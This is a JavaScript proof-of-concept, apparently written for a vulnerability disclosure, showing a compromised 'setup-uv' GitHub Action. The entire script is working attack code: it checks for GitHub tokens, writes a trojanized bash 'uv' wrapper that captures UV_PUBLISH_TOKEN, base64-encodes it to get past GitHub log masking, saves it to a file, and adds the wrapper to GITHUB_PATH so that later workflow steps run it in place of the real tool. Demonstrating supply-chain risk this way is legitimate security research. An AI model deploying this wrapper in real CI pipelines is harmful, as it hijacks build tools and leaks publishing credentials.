const fs = require('fs');
const path = require('path');
const os = require('os');

console.log('=== [PoC] Compromised setup-uv action executing ===');
console.log('');

// 1. Demonstrate github.token access via default input
const token = process.env['INPUT_GITHUB-TOKEN'] || process.env['INPUT_GITHUB_TOKEN'] || '';
const ghToken = process.env['GITHUB_TOKEN'] || '';
console.log(`[PoC] github-token input: ${token ? 'PRESENT (' + token.length + ' chars)' : 'NOT SET'}`);
console.log(`[PoC] GITHUB_TOKEN env:   ${ghToken ? 'PRESENT (' + ghToken.length + ' chars)' : 'NOT SET'}`);
console.log('');

// 2. Install trojanized uv wrapper
const evilDir = path.join(os.tmpdir(), '_poc_evil_uv');
fs.mkdirSync(evilDir, { recursive: true });

const evidenceFile = path.join(os.tmpdir(), 'poc_captured_secrets.txt');

// Write wrapper script
const wrapper = `#!/bin/bash
echo ""
echo "=== [PoC-Wrapper] uv command intercepted ==="
echo "[PoC-Wrapper] Command: uv $*"
echo "[PoC-Wrapper] Working dir: $(pwd)"
echo ""

# Capture secrets from environment
EVIDENCE_FILE="${evidenceFile}"
echo "=== Captured at $(date -u) ===" >> "$EVIDENCE_FILE"
echo "CMD: uv $*" >> "$EVIDENCE_FILE"

if [ -n "$UV_PUBLISH_TOKEN" ]; then
    echo "[PoC-Wrapper] UV_PUBLISH_TOKEN: PRESENT (${#UV_PUBLISH_TOKEN} chars)"
    # base64 encode to bypass GitHub log masking (same technique as real attacks)
    B64=$(echo -n "$UV_PUBLISH_TOKEN" | base64)
    echo "[PoC-Wrapper] UV_PUBLISH_TOKEN (b64): $B64"
    echo "UV_PUBLISH_TOKEN=$UV_PUBLISH_TOKEN" >> "$EVIDENCE_FILE"
    echo "UV_PUBLISH_TOKEN_B64=$B64" >> "$EVIDENCE_FILE"
else
    echo "[PoC-Wrapper] UV_PUBLISH_TOKEN: NOT SET"
fi

if [ -n "$GITHUB_TOKEN" ]; then
    echo "[PoC-Wrapper] GITHUB_TOKEN: PRESENT (${#GITHUB_TOKEN} chars)"
    echo "GITHUB_TOKEN_LENGTH=${#GITHUB_TOKEN}" >> "$EVIDENCE_FILE"
fi

echo "" >> "$EVIDENCE_FILE"
echo "[PoC-Wrapper] Evidence written to $EVIDENCE_FILE"
echo "=== [PoC-Wrapper] Done ==="
echo ""
`;

fs.writeFileSync(path.join(evilDir, 'uv'), wrapper, { mode: 0o755 });
console.log(`[PoC] Trojanized uv wrapper installed: ${evilDir}/uv`);

// 3. Add to GITHUB_PATH (affects subsequent steps)
const ghPath = process.env['GITHUB_PATH'];
if (ghPath) {
    fs.appendFileSync(ghPath, evilDir + '\\n');
    console.log(`[PoC] Added ${evilDir} to GITHUB_PATH`);
    console.log('[PoC] Subsequent steps will resolve "uv" to the wrapper');
} else {
    console.log('[PoC] GITHUB_PATH not available (not in Actions environment)');
}

console.log('');
console.log('=== [PoC] Compromised action setup complete ===');
